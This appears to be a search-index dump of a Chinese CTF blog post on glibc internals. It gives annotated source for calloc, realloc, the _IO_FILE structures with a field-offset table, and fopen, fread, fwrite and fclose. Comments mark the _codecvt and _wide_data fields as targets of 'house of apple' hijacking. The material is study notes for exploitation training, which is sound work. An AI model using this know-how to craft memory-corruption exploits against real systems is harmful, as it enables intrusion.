chunk需要清空的内存大小为 top chunk 到原先 heap 区域末尾位置 if (av == \u0026main_arena \u0026\u0026 oldtopsize \u003c mp_.sbrk_base + av-\u003emax_system_mem - (char *)oldtop) oldtopsize = (mp_.sbrk_base + av-\u003emax_system_mem - (char *)oldtop); #endif // 非主线程 if (av != \u0026main_arena) { // top chunk 需要清空的内存大小为 top chunk 到原先 heap_info 受保护区域末尾位置 heap_info *heap = heap_for_ptr(oldtop); // 获取heap_info if (oldtopsize \u003c (char *)heap + heap-\u003emprotect_size - (char *)oldtop) oldtopsize = (char *)heap + heap-\u003emprotect_size - (char *)oldtop; } #endif } else { // 无可用的arena，后续_int_malloc会直接mmap获取内存，而mmap获取内存初始值为0，不需要清零 oldtop = 0; oldtopsize = 0; } mem = _int_malloc(av, sz); // 在 arena 中尝试分配内存 assert(!mem || chunk_is_mmapped(mem2chunk(mem)) || // 未申请到内存或mmap获取的内存 av == arena_for_chunk(mem2chunk(mem))); // 内存从当前线程对应的arena管理的内存中获取 // 未申请到内存且arena不为空 if (mem == 0 \u0026\u0026 av != NULL) { LIBC_PROBE(memory_calloc_retry, 1, sz); av = arena_get_retry(av, sz); // 再次获取arena mem = _int_malloc(av, sz); // 再次申请分配内存 } if (av != NULL) (void)mutex_unlock(\u0026av-\u003emutex); if (mem == 0) return 0; // 申请为0则退出 p = mem2chunk(mem); // 将申请到的内存转换为chunk地址 if (chunk_is_mmapped(p)) { if (__builtin_expect(perturb_byte, 0)) return memset(mem, 0, sz); return mem; // 直接返回，因为mmap的内存默认初始化为0 } csz = chunksize(p); // 需要清空的堆大小 #if MORECORE_CLEARS if (perturb_byte == 0 \u0026\u0026 (p == oldtop \u0026\u0026 csz \u003e oldtopsize)) { // 如果是从 top chunk 上切下来的，申请比原先top chunk大小大，则说明原来top chunk扩展 // 只需要清零 top chunk 范围的内存 csz = oldtopsize; } #endif d = (INTERNAL_SIZE_T *)mem; clearsize = csz - SIZE_SZ; nclears = clearsize / sizeof(INTERNAL_SIZE_T); assert(nclears \u003e= 3); if (nclears \u003e 9) return memset(d, 0, clearsize);// 清零字节数较多，直接调用 memset else // 字节数较少，使用循环展开手动清零，以优化性能 { *(d + 0) = 0; *(d + 1) = 0; *(d + 2) = 0; if (nclears \u003e 4) { *(d + 3) = 0; *(d + 4) = 0; if (nclears \u003e 6) { *(d + 5) = 0; *(d + 6) = 0; if (nclears \u003e 8) { *(d + 7) = 0; *(d + 8) = 0; } } } } return mem; } ","date":"2024-11-19","objectID":"/source_analyze/:1:5","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"realloc 2.23 __libc_realloc void *__libc_realloc(void *oldmem, size_t bytes) { mstate ar_ptr; INTERNAL_SIZE_T nb; /* padded request size */ void *newp; /* 返回的堆块 */ void *(*hook)(void *, size_t, const void *) = atomic_forced_read(__realloc_hook); if (__builtin_expect(hook != NULL, 0)) return (*hook)(oldmem, bytes, RETURN_ADDRESS(0)); // 若realloc_hook被设置则调用 #if REALLOC_ZERO_BYTES_FREES if (bytes == 0 \u0026\u0026 oldmem != NULL) // 若大小为0即 realloc(0) { __libc_free(oldmem); // 相当于free，将oldmem指针对应堆块释放 return 0; } #endif if (oldmem == 0) // 若 oldmem 为 NULL，相当于 malloc(bytes) return __libc_malloc(bytes); const mchunkptr oldp = mem2chunk(oldmem); // 将chunk转换为对应内存大小 const INTERNAL_SIZE_T oldsize = chunksize(oldp); // 获取chunk大小 if (chunk_is_mmapped(oldp)) ar_ptr = NULL; // 若是mmap申请，则arena指针为空 else ar_ptr = arena_for_chunk(oldp); // 否则通过该chunk获取arena地址 if (__builtin_expect((uintptr_t)oldp \u003e (uintptr_t)-oldsize, 0) || // 不超过内存空间，判断溢出 __builtin_expect(misaligned_chunk(oldp), 0)) // 该堆块必须关于0x10对齐 { malloc_printerr(check_action, \"realloc(): invalid pointer\", oldmem, ar_ptr); return NULL; } checked_request2size(bytes, nb); // 将申请内存转换为适合内存分配的块大小, 转换为nb大小 // 若该chunk是mmap的 if (chunk_is_mmapped(oldp)) { void *newmem; #if HAVE_MREMAP newp = mremap_chunk(oldp, nb); // 将oldp原来的chunk的大小调整为nb if (newp) return chunk2mem(newp); // 调整成功返回 #endif if (oldsize - SIZE_SZ \u003e= nb) // 减去头的用户数据大小要大于申请的堆块大小 return oldmem; // 若 mremap失败，则通过malloc获取内存 newmem = __libc_malloc(bytes); if (newmem == 0) return 0; // 将原先内存的数据复制到新内存中 memcpy(newmem, oldmem, oldsize - 2 * SIZE_SZ); munmap_chunk(oldp); // 将原先内存释放掉 return newmem; } // 若不是mmap的则为ptmalloc申请 (void)mutex_lock(\u0026ar_ptr-\u003emutex); // 上锁 newp = _int_realloc(ar_ptr, oldp, oldsize, nb); // 调用 _int_realloc 核心函数 (void)mutex_unlock(\u0026ar_ptr-\u003emutex); // 解锁 // 判断三种情况 assert(!newp || chunk_is_mmapped(mem2chunk(newp)) || ar_ptr == arena_for_chunk(mem2chunk(newp))); // realloc 申请没调整成功 if (newp == NULL) { LIBC_PROBE(memory_realloc_retry, 2, bytes, oldmem); newp = __libc_malloc(bytes); // 尝试malloc if (newp != NULL) { memcpy(newp, oldmem, oldsize - SIZE_SZ); // 复制数据到新内存 _int_free(ar_ptr, oldp, 0); // 释放旧内存 } } return newp; } int_realloc 用于重新分配内存块，尝试更改内存块大小 // av指向内存状态的指针，oldp指向内存状态的指针，oldsize当前块的大小，nb请求的新大小 void * _int_realloc(mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize, INTERNAL_SIZE_T nb) { mchunkptr newp; /* 新分配的内存块指针 */ INTERNAL_SIZE_T newsize; /* 新内存块大小 */ void *newmem; /* 对应用户内存的指针 */ mchunkptr next; /* 指向oldp后面的连续内存块 */ mchunkptr remainder; /* 新分配内存后剩余的内存块 */ unsigned long remainder_size; /* 剩余内存块大小 */ mchunkptr bck; /* 链表临时变量 */ mchunkptr fwd; /* 链表临时变量 */ unsigned long copysize; /* 需要复制的字节数 */ unsigned int ncopies; /* 需要复制的INTERNAL_SIZE_T字数 */ INTERNAL_SIZE_T *s; /* 复制源的指针 */ INTERNAL_SIZE_T *d; /* 复制目标的指针 */ const char *errstr = NULL; // 若大小小于0x10或大于系统内存 if (__builtin_expect(oldp-\u003esize \u003c= 2 * SIZE_SZ, 0) || __builtin_expect(oldsize \u003e= av-\u003esystem_mem, 0)) { errstr = \"realloc(): invalid old size\"; errout: malloc_printerr(check_action, errstr, chunk2mem(oldp), av); // 报错 return NULL; } check_inuse_chunk(av, oldp); assert(!chunk_is_mmapped(oldp)); // 检查该chunk不是mmap申请的 next = chunk_at_offset(oldp, oldsize); // 获取下一个chunk INTERNAL_SIZE_T nextsize = chunksize(next); // 下一个chunk大小 if (__builtin_expect(next-\u003esize \u003c= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize \u003e= av-\u003esystem_mem, 0)) { errstr = \"realloc(): invalid next size\"; // 安全检查下一个chunk大小 goto errout; } if ((unsigned long)(oldsize) \u003e= (unsigned long)(nb)) { // chunk大小足够大 newp = oldp; newsize = oldsize; } else { // chunk大小不足够申请的大小nb，尝试扩展内存 if (next == av-\u003etop \u0026\u0026 // 下一个chunk是top chunk (unsigned long)(newsize = oldsize + nextsize) \u003e= (unsigned long)(nb + MINSIZE)) { // 且两个chunk大小大于nb+MINSIZE set_head_size(oldp, nb | (av != \u0026main_arena ? NON_MAIN_ARENA : 0)); av-\u003etop = chunk_at_offset(oldp, nb); // 设置top chunk为oldp偏移nb，即切割一片内存与原堆块合并 set_head(av-\u003etop, (newsize - nb) | PREV_INUSE); check_inuse_chunk(av, oldp); return chunk2mem(oldp); // 返回合并后堆块 } else if (next != av-\u003etop \u0026\u0026 // 若下一个chunk不是","date":"2024-11-19","objectID":"/source_analyze/:1:6","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"IO_FILE ","date":"2024-11-19","objectID":"/source_analyze/:2:0","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"结构 _IO_list_all // 指向_IO_FILE单链表的链表头 extern struct _IO_FILE_plus *_IO_list_all; _IO_FILE_plus struct _IO_FILE_plus { _IO_FILE file; // vtable: 实现文件流操作的虚函数表,包含一组函数指针,指向实现各种IO操作的函数，不同的对象指向函数可能不同 const struct _IO_jump_t *vtable; }; _IO_FILE struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ /* The following pointers correspond to the C++ streambuf protocol. */ char *_IO_read_ptr; /* 指针指向当前读到的位置 */ char *_IO_read_end; /* get area的结束，系统读取数据的结尾 */ char *_IO_read_base; /* putback+get area的开始，系统读取数据的开头 */ char *_IO_write_base; /* IO文件缓冲区开头 */ char *_IO_write_ptr; /* 指针指向当前写到的位置 */ char *_IO_write_end; /* IO文件缓冲区结尾 */ char *_IO_buf_base; /* buf缓冲区的开始 */ char *_IO_buf_end; /* buf缓冲区的结束 */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; // 指向下一个_IO_FILE结构体 int _fileno; int _flags2; __off_t _old_offset; unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; 偏移 0x0:'_flags', 0x8:'_IO_read_ptr', 0x10:'_IO_read_end', 0x18:'_IO_read_base', 0x20:'_IO_write_base', 0x28:'_IO_write_ptr', 0x30:'_IO_write_end', 0x38:'_IO_buf_base', 0x40:'_IO_buf_end', 0x48:'_IO_save_base', 0x50:'_IO_backup_base', 0x58:'_IO_save_end', 0x60:'_markers', 0x68:'_chain', 0x70:'_fileno', 0x74:'_flags2', 0x78:'_old_offset', 0x80:'_cur_column', 0x82:'_vtable_offset', 0x83:'_shortbuf', 0x88:'_lock', 0x90:'_offset', 0x98:'_codecvt', 0xa0:'_wide_data', 0xa8:'_freeres_list', 0xb0:'_freeres_buf', 0xb8:'__pad5', 0xc0:'_mode', 0xc4:'_unused2', 0xd8:'vtable' _IO_FILE_complete struct _IO_FILE_complete { struct _IO_FILE _file; __off64_t _offset; struct _IO_codecvt *_codecvt; // house of apple 3利用 struct _IO_wide_data *_wide_data; // house of apple 2劫持这个变量 struct _IO_FILE *_freeres_list; void *_freeres_buf; size_t __pad5; int _mode; char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)]; }; _IO_codecvt struct _IO_codecvt { _IO_iconv_t __cd_in; _IO_iconv_t __cd_out; }; _IO_iconv_t typedef struct { struct __gconv_step *step; struct __gconv_step_data step_data; } _IO_iconv_t; __gconv_step struct __gconv_step { struct __gconv_loaded_object *__shlib_handle; const char *__modname; int __counter; char *__from_name; char *__to_name; __gconv_fct __fct; __gconv_btowc_fct __btowc_fct; __gconv_init_fct __init_fct; __gconv_end_fct __end_fct; int __min_needed_from; int __max_needed_from; int __min_needed_to; int __max_needed_to; int __stateful; void *__data; }; _IO_wstrnfile typedef struct{ _IO_strfile f; wchar_t overflow_buf[64]; // overflow_buf } _IO_wstrnfile; _IO_strnfile typedef struct{ _IO_strfile f; char overflow_buf[64]; } _IO_strnfile; _IO_strfile typedef struct _IO_strfile_ { struct _IO_streambuf _sbf; struct _IO_str_fields _s; } _IO_strfile; _IO_streambuf struct _IO_streambuf { FILE _f; const struct _IO_jump_t *vtable; }; _IO_str_fields struct _IO_str_fields { _IO_alloc_type _allocate_buffer_unused; _IO_free_type _free_buffer_unused; }; _IO_wide_data // 结构与_IO_FILE很像 struct _IO_wide_data { wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __","date":"2024-11-19","objectID":"/source_analyze/:2:1","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"fopen fopen # define fopen(fname, mode) _IO_new_fopen (fname, mode) _IO_new_fopen FILE *_IO_new_fopen (const char *filename, const char *mode) { return __fopen_internal (filename, mode, 1); } __fopen_internal FILE *__fopen_internal (const char *filename, const char *mode, int is32) { struct locked_FILE { struct _IO_FILE_plus fp; // 若定义了 _IO_MTSAFE_IO 宏，结构体将包含 lock 成员， // 实现条件性编译，针对是否支持多线程安全生成不同的结构体布局 #ifdef _IO_MTSAFE_IO _IO_lock_t lock; #endif struct _IO_wide_data wd; } *new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE)); // malloc创建locked_FILE结构体 if (new_f == NULL) return NULL; #ifdef _IO_MTSAFE_IO // 初始化多线程锁 new_f-\u003efp.file._lock = \u0026new_f-\u003elock; #endif // NULL初始化 _IO_no_init (\u0026new_f-\u003efp.file, 0, 0, \u0026new_f-\u003ewd, \u0026_IO_wfile_jumps); // 设置vtable _IO_JUMPS (\u0026new_f-\u003efp) = \u0026_IO_file_jumps; // 将结构体插入链表中 _IO_new_file_init_internal (\u0026new_f-\u003efp); // 执行系统调用打开文件 if (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != NULL) return __fopen_maybe_mmap (\u0026new_f-\u003efp.file); _IO_un_link (\u0026new_f-\u003efp); free (new_f); return NULL; } _IO_no_init // 初始化操作 void _IO_no_init (FILE *fp, int flags, int orientation, struct _IO_wide_data *wd, const struct _IO_jump_t *jmp) { _IO_old_init (fp, flags); fp-\u003e_mode = orientation; if (orientation \u003e= 0) { fp-\u003e_wide_data = wd; fp-\u003e_wide_data-\u003e_IO_buf_base = NULL; fp-\u003e_wide_data-\u003e_IO_buf_end = NULL; fp-\u003e_wide_data-\u003e_IO_read_base = NULL; fp-\u003e_wide_data-\u003e_IO_read_ptr = NULL; fp-\u003e_wide_data-\u003e_IO_read_end = NULL; fp-\u003e_wide_data-\u003e_IO_write_base = NULL; fp-\u003e_wide_data-\u003e_IO_write_ptr = NULL; fp-\u003e_wide_data-\u003e_IO_write_end = NULL; fp-\u003e_wide_data-\u003e_IO_save_base = NULL; fp-\u003e_wide_data-\u003e_IO_backup_base = NULL; fp-\u003e_wide_data-\u003e_IO_save_end = NULL; fp-\u003e_wide_data-\u003e_wide_vtable = jmp; } else fp-\u003e_wide_data = (struct _IO_wide_data *) -1L; fp-\u003e_freeres_list = NULL; } _IO_old_init void _IO_old_init (FILE *fp, int flags) { fp-\u003e_flags = _IO_MAGIC|flags; // #define _IO_MAGIC 0xFBAD0000 魔数 fp-\u003e_flags2 = 0; if (stdio_needs_locking) fp-\u003e_flags2 |= _IO_FLAGS2_NEED_LOCK; fp-\u003e_IO_buf_base = NULL; fp-\u003e_IO_buf_end = NULL; fp-\u003e_IO_read_base = NULL; fp-\u003e_IO_read_ptr = NULL; fp-\u003e_IO_read_end = NULL; fp-\u003e_IO_write_base = NULL; fp-\u003e_IO_write_ptr = NULL; fp-\u003e_IO_write_end = NULL; fp-\u003e_chain = NULL; fp-\u003e_IO_save_base = NULL; fp-\u003e_IO_backup_base = NULL; fp-\u003e_IO_save_end = NULL; fp-\u003e_markers = NULL; fp-\u003e_cur_column = 0; #if _IO_JUMPS_OFFSET fp-\u003e_vtable_offset = 0; #endif #ifdef _IO_MTSAFE_IO if (fp-\u003e_lock != NULL) _IO_lock_init (*fp-\u003e_lock); #endif } _IO_new_file_init_internal void _IO_new_file_init_internal (struct _IO_FILE_plus *fp) { // 设置一些标志 fp-\u003efile._offset = _IO_pos_BAD; fp-\u003efile._flags |= CLOSED_FILEBUF_FLAGS; _IO_link_in (fp); // 头插法加到链表中 fp-\u003efile._fileno = -1; } _IO_new_file_fopen FILE *_IO_new_file_fopen (FILE *fp, const char *filename, const char *mode, int is32not64) { int oflags = 0, omode; int read_write; int oprot = 0666; int i; FILE *result; const char *cs; const char *last_recognized; if (_IO_file_is_open (fp)) return 0; switch (*mode) { case 'r': omode = O_RDONLY; read_write = _IO_NO_WRITES; break; case 'w': omode = O_WRONLY; oflags = O_CREAT|O_TRUNC; read_write = _IO_NO_READS; break; case 'a': omode = O_WRONLY; oflags = O_CREAT|O_APPEND; read_write = _IO_NO_READS|_IO_IS_APPENDING; break; default: __set_errno (EINVAL); return NULL; } last_recognized = mode; for (i = 1; i \u003c 7; ++i) { switch (*++mode) { case '\\0': break; case '+': omode = O_RDWR; read_write \u0026= _IO_IS_APPENDING; last_recognized = mode; continue; case 'x': oflags |= O_EXCL; last_recognized = mode; continue; case 'b': last_recognized = mode; continue; case 'm': fp-\u003e_flags2 |= _IO_FLAGS2_MMAP; continue; case 'c': fp-\u003e_flags2 |= _IO_FLAGS2_NOTCANCEL; continue; case 'e': oflags |= O_CLOEXEC; fp-\u003e_flags2 |= _IO_FLAGS2_CLOEXEC; continue; default: continue; } break; } result = _IO_file_open (fp, filename, omode|oflags, oprot, read_write, is32not64); if (result != NULL) { cs = strstr (last_recognized + 1, \",ccs=\"); if (cs != NULL) { struct gconv_fcts fcts; stru","date":"2024-11-19","objectID":"/source_analyze/:2:2","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"fread fread #define fread(p, m, n, s) _IO_fread (p, m, n, s) _IO_fread size_t _IO_fread (void *buf, size_t size, size_t count, FILE *fp) { size_t bytes_requested = size * count; size_t bytes_read; CHECK_FILE (fp, 0); if (bytes_requested == 0) return 0; _IO_acquire_lock (fp); bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested); _IO_release_lock (fp); return bytes_requested == bytes_read ? count : bytes_read / size; } libc_hidden_def (_IO_fread) _IO_sgetn #define _IO_XSGETN(FP, DATA, N) JUMP2 (__xsgetn, FP, DATA, N) #define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)-\u003eFUNC) (THIS, X1, X2) # define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) size_t _IO_sgetn (FILE *fp, void *data, size_t n) { // 会通过vtable调用不同结构体的函数 _IO_file_xsgetn return _IO_XSGETN (fp, data, n); } libc_hidden_def (_IO_sgetn) _IO_file_xsgetn // 通过文件流fp从文件系统读取最多n字节数据到用户缓冲区data中 size_t _IO_file_xsgetn(FILE *fp, void *data, size_t n) { size_t want, have; ssize_t count; char *s = data; // 指向用户缓冲区data want = n; // 剩余需要读取的字节数，初始为n if (fp-\u003e_IO_buf_base == NULL) // 文件流缓冲区未初始化 { if (fp-\u003e_IO_save_base != NULL) { free(fp-\u003e_IO_save_base); // 释放备份缓冲区 fp-\u003e_flags \u0026= ~_IO_IN_BACKUP; // 清除备份模式标志 } // 初始化文件流缓冲区 _IO_doallocbuf(fp); } // 仍有数据需要读取 while (want \u003e 0) { have = fp-\u003e_IO_read_end - fp-\u003e_IO_read_ptr; // 文件流缓冲区剩余数据大小 // 文件流缓冲区大小足够满足需要读取的字节数want if (want \u003c= have) { memcpy(s, fp-\u003e_IO_read_ptr, want); // 从文件流缓冲区复制到用户缓冲区 fp-\u003e_IO_read_ptr += want; // 更新指针 want = 0; // 标记读取完成 } // 若文件流缓冲区数据不足 else { if (have \u003e 0) // 文件流缓冲区中还有部分数据可用 { // 先尽可能多的从文件流缓冲区复制到用户缓冲区 s = __mempcpy(s, fp-\u003e_IO_read_ptr, have); want -= have; // 更新剩余需求 fp-\u003e_IO_read_ptr += have; // 更新文件流缓冲区读取指针 } // 处于备份模式 if (_IO_in_backup(fp)) { _IO_switch_to_main_get_area(fp); continue; // 切换备份缓冲区重新尝试读取 } // 若文件流缓冲区未满 且 需要读取的数据小于文件流缓冲区总容量 if (fp-\u003e_IO_buf_base \u0026\u0026 want \u003c (size_t)(fp-\u003e_IO_buf_end - fp-\u003e_IO_buf_base)) { // underflow 调用系统函数将数据读入文件流缓冲区, 实际调用 _IO_UNDERFLOW // 最终调用 _IO_new_file_underflow 函数 if (__underflow(fp) == EOF) break; continue; // 填充完文件流缓冲区，继续尝试读取 } // 所需读取的数据大于文件流缓冲区总容量 // 重置文件流缓冲区指针 _IO_setg(fp, fp-\u003e_IO_buf_base, fp-\u003e_IO_buf_base, fp-\u003e_IO_buf_base); _IO_setp(fp, fp-\u003e_IO_buf_base, fp-\u003e_IO_buf_base); // 对齐，若文件流缓冲区大小不小于128字节，则读入长度为文件流缓冲区长度整数倍 count = want; if (fp-\u003e_IO_buf_base) { size_t block_size = fp-\u003e_IO_buf_end - fp-\u003e_IO_buf_base; if (block_size \u003e= 128) count -= want % block_size; } // 直接系统调用读取文件中数据到用户缓冲区中 count = _IO_SYSREAD(fp, s, count); if (count \u003c= 0) { if (count == 0) fp-\u003e_flags |= _IO_EOF_SEEN; else fp-\u003e_flags |= _IO_ERR_SEEN; break; } // 更新 s += count; want -= count; if (fp-\u003e_offset != _IO_pos_BAD) _IO_pos_adjust(fp-\u003e_offset, count); } } return n - want; } libc_hidden_def(_IO_file_xsgetn) _IO_doallocbuf void _IO_doallocbuf (FILE *fp) { if (fp-\u003e_IO_buf_base) return; if (!(fp-\u003e_flags \u0026 _IO_UNBUFFERED) || fp-\u003e_mode \u003e 0) if (_IO_DOALLOCATE (fp) != EOF) return; _IO_setb (fp, fp-\u003e_shortbuf, fp-\u003e_shortbuf+1, 0); } libc_hidden_def (_IO_doallocbuf) _IO_new_file_underflow int _IO_new_file_underflow(_IO_FILE *fp) { _IO_ssize_t count; // 存储从文件中读取的字节数 #if 0 if (fp-\u003e_flags \u0026 _IO_EOF_SEEN) return (EOF); #endif if (fp-\u003e_flags \u0026 _IO_NO_READS) // 文件末尾已经被读取, 表示不允许读取数据 { fp-\u003e_flags |= _IO_ERR_SEEN; __set_errno(EBADF); // 文件描述符无效 return EOF; } // 文件流缓冲区已有数据，直接返回_IO_read_ptr指向的数据 if (fp-\u003e_IO_read_ptr \u003c fp-\u003e_IO_read_end) return *(unsigned char *)fp-\u003e_IO_read_ptr; // 若文件流没有为读取分配缓冲区 if (fp-\u003e_IO_buf_base == NULL) { if (fp-\u003e_IO_save_base != NULL) // 之前有分配过备份的缓冲区 { free(fp-\u003e_IO_save_base); // 释放这些缓冲区 fp-\u003e_flags \u0026= ~_IO_IN_BACKUP; } _IO_doallocbuf(fp); // 分配新文件流缓冲区 } // 是否设置 行缓冲 或 无缓冲 if (fp-\u003e_flags \u0026 (_IO_LINE_BUF | _IO_UNBUFFERED)) { #if 0 _IO_flush_all_linebuffered (); #else _IO_acquire_lock(_IO_stdout); if ((_IO_stdout-\u003e_flags \u0026 (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF)) _IO_OVERFLOW(_IO_stdout, EOF);// 调用_IO_OVERFLOW函数处理标准输出的溢出情况 _IO_release_lock(_IO_stdout); #endif } _IO_switch_to_get_mode(fp); // 切换为读取模式 // 设置读写指针均为缓冲区基地址 fp-\u003e_IO_read_base = fp-\u003e_IO_","date":"2024-11-19","objectID":"/source_analyze/:2:3","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"fwrite fwrite #define fwrite(buf, size, count, fp) _IO_fwrite (buf, size, count, fp) _IO_fwrite size_t _IO_fwrite (const void *buf, size_t size, size_t count, FILE *fp) { size_t request = size * count; size_t written = 0; CHECK_FILE (fp, 0); if (request == 0) return 0; _IO_acquire_lock (fp); if (_IO_vtable_offset (fp) != 0 || _IO_fwide (fp, -1) == -1) written = _IO_sputn (fp, (const char *) buf, request); _IO_release_lock (fp); if (written == request || written == EOF) return count; else return written / size; } libc_hidden_def (_IO_fwrite) _IO_new_file_xsputn // 从用户缓冲区data写入文件流f中 size_t _IO_new_file_xsputn(FILE *f, const void *data, size_t n) { const char *s = (const char *)data; // 用户缓冲区指针 size_t to_do = n; // 写入数据长度 int must_flush = 0; // 标志是否需要立即刷新文件流缓冲区 size_t count = 0; if (n \u003c= 0) return 0; // 判断是否为行缓冲模式，即遇到换行符立即刷新文件流缓冲区 if ((f-\u003e_flags \u0026 _IO_LINE_BUF) \u0026\u0026 (f-\u003e_flags \u0026 _IO_CURRENTLY_PUTTING)) { // 文件流缓冲区剩余空间大小 count = f-\u003e_IO_buf_end - f-\u003e_IO_write_ptr; if (count \u003e= n) // 若文件流缓冲区能容纳所有数据data { const char *p; for (p = s + n; p \u003e s;) // 从用户数据末尾向前查找换行符 { if (*--p == '\\n') // 找到换行符 { count = p - s + 1; // 只写入到换行符前数据 must_flush = 1; // 立即刷新输出数据 break; } } } } // 非行缓冲模式，文件流缓冲区仍有可用空间，获取剩余空间count else if (f-\u003e_IO_write_end \u003e f-\u003e_IO_write_ptr) count = f-\u003e_IO_write_end - f-\u003e_IO_write_ptr; if (count \u003e 0) { if (count \u003e to_do) count = to_do; // 若文件流缓冲区能容纳所有剩余数据 // 将数据data写入到文件流缓冲区中 f-\u003e_IO_write_ptr = __mempcpy(f-\u003e_IO_write_ptr, s, count); // 更新 s += count; to_do -= count; } // 若需要刷新缓冲区或仍有数据未写 if (to_do + must_flush \u003e 0) { size_t block_size, do_write; // 强制输出并刷新清空文件流缓冲区 // 实际调用了_IO_new_file_overflow if (_IO_OVERFLOW(f, EOF) == EOF) return to_do == 0 ? EOF : n - to_do; // 对齐 block_size = f-\u003e_IO_buf_end - f-\u003e_IO_buf_base; do_write = to_do - (block_size \u003e= 128 ? to_do % block_size : 0); if (do_write) { // 调用new_do_write直接输出数据 count = new_do_write(f, s, do_write); to_do -= count; if (count \u003c do_write) return n - to_do; } if (to_do) // 将剩余数据复制到文件流缓冲区 to_do -= _IO_default_xsputn(f, s + do_write, to_do); } return n - to_do; } libc_hidden_ver(_IO_new_file_xsputn, _IO_file_xsputn) _IO_new_file_overflow int _IO_new_file_overflow(_IO_FILE *f, int ch) { // 检查是否允许写入 if (f-\u003e_flags \u0026 _IO_NO_WRITES) { f-\u003e_flags |= _IO_ERR_SEEN; __set_errno(EBADF); // 操作失败，写入错误 return EOF; } if ((f-\u003e_flags \u0026 _IO_CURRENTLY_PUTTING) == 0 || f-\u003e_IO_write_base == NULL) { // 若未分配写入缓冲区 if (f-\u003e_IO_write_base == NULL) { _IO_doallocbuf(f); // 初始化分配缓冲区 _IO_setg(f, f-\u003e_IO_buf_base, f-\u003e_IO_buf_base, f-\u003e_IO_buf_base); // 设置缓冲区起点 } // 处理备份缓冲区 if (__glibc_unlikely(_IO_in_backup(f))) { size_t nbackup = f-\u003e_IO_read_end - f-\u003e_IO_read_ptr; _IO_free_backup_area(f); f-\u003e_IO_read_base -= MIN(nbackup, f-\u003e_IO_read_base - f-\u003e_IO_buf_base); f-\u003e_IO_read_ptr = f-\u003e_IO_read_base; } // 若读取指针到达缓冲区末尾，重置为缓冲区起始位置 if (f-\u003e_IO_read_ptr == f-\u003e_IO_buf_end) f-\u003e_IO_read_end = f-\u003e_IO_read_ptr = f-\u003e_IO_buf_base; // 写入指针和缓冲区指针统一到读取指针位置 f-\u003e_IO_write_ptr = f-\u003e_IO_read_ptr; f-\u003e_IO_write_base = f-\u003e_IO_write_ptr; f-\u003e_IO_write_end = f-\u003e_IO_buf_end; f-\u003e_IO_read_base = f-\u003e_IO_read_ptr = f-\u003e_IO_read_end; // 文件流进入写入模式 f-\u003e_flags |= _IO_CURRENTLY_PUTTING; // 文件流处于行缓冲或无缓冲模式 if (f-\u003e_mode \u003c= 0 \u0026\u0026 f-\u003e_flags \u0026 (_IO_LINE_BUF | _IO_UNBUFFERED)) f-\u003e_IO_write_end = f-\u003e_IO_write_ptr; } if (ch == EOF) // 直接将缓冲区内容写入文件，实际调用new_do_write return _IO_do_write(f, f-\u003e_IO_write_base, f-\u003e_IO_write_ptr - f-\u003e_IO_write_base); // 写入指针已到达缓冲区末尾，表示缓冲区已满，调用_IO_do_flush刷新缓冲区 if (f-\u003e_IO_write_ptr == f-\u003e_IO_buf_end) if (_IO_do_flush(f) == EOF) return EOF; // 刷新失败 // 将ch写入当前的写入指针位置，写入指针移动 *f-\u003e_IO_write_ptr++ = ch; // 无缓冲模式/行缓冲模式且写入\\n，立即将缓冲区数据写入文件 if ((f-\u003e_flags \u0026 _IO_UNBUFFERED) || ((f-\u003e_flags \u0026 _IO_LINE_BUF) \u0026\u0026 ch == '\\n')) if (_IO_do_write(f, f-\u003e_IO_write_base, f-\u003e_IO_write_ptr - f-\u003e_IO_write_base) == EOF) return EOF; // 返回写入的字符 return (unsigned char)ch; } libc_hidden_ver(_IO_new_file_overflow, _IO_file_overflow) new_do_write // 调用了系统调用 将data写入fp static size_t new_do_write(FILE *fp, const char *data, size_t to_do) { size_t count; // 文件流处于追加模式 if (fp-\u003e_flags \u0026","date":"2024-11-19","objectID":"/source_analyze/:2:4","tags":["pwn"],"title":"glibc源码分析","uri":"/source_analyze/"},{"categories":["Notes","CTF"],"content":"fclose fclose #define fclose(fp) _IO_new_fclose (fp) _IO_new_fclose int _IO_new_fclose (FILE *fp) { int status; CHECK_FILE(fp, EOF); #if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1) if (_IO_vtable_offset (fp) != 0) return _IO_old_fclose (fp); #endif if (fp-\u003e_flags \u0026 